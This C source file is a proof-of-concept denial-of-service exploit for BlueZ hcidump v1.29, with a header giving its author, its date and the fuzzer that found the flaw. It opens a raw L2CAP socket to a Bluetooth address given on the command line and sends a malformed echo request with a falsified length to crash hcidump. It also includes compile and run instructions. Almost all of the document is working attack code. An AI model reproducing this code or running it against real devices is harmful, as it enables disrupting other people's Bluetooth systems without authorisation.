/* Bluez hcidump v1.29 DoS - PoC code */
/* Pierre BETOUIN - pierre.betouin@infratech.fr */
/* 01/18/06 */
/* Vulnerability found using BSS fuzzer : */
/* Download www.secuobs.com/news/05022006-bluetooth10.shtml */
/* Crashes hcidump sending bad L2CAP packet */
/* */
/* gcc -lbluetooth hcidump-crash.c -o hcidump-crash */
/* ./hcidump-crash 00:80:37:XX:XX:XX */
/* L2CAP packet sent (15) */
/* Buffer: 08 01 0C 00 41 41 41 41 41 41 41 41 41 41 41 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#define SIZE 15
#define FAKE_SIZE 12

int main(int argc, char **argv)
{
char *buffer;
l2cap_cmd_hdr *cmd;
struct sockaddr_l2 addr;
int sock, sent, i;

if(argc < 2)
{
fprintf(stderr, "%s <btaddr>\n", argv[0]);
exit(EXIT_FAILURE);
}

if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0)
{
perror("socket");
exit(EXIT_FAILURE);
}

memset(&addr, 0, sizeof(addr));
addr.l2_family = AF_BLUETOOTH;

if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0)
{
perror("bind");
exit(EXIT_FAILURE);
}

str2ba(argv[1], &addr.l2_bdaddr);

if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0)
{
perror("connect");
exit(EXIT_FAILURE);
}

if(!(buffer = (char *) malloc ((int) SIZE + 1)))
{
perror("malloc");
exit(EXIT_FAILURE);
}

memset(buffer, 'A', SIZE);

cmd = (l2cap_cmd_hdr *) buffer;
cmd->code = L2CAP_ECHO_REQ;
cmd->ident = 1;
cmd->len = FAKE_SIZE;

if( (sent=send(sock, buffer, SIZE, 0)) >= 0)
{
printf("L2CAP packet sent (%d)\n", sent);
}

printf("Buffer:\t");
for(i=0; i<sent; i++)
printf("%.2X ", (unsigned char) buffer[i]);
printf("\n");

free(buffer);
close(sock);
return EXIT_SUCCESS;
} 
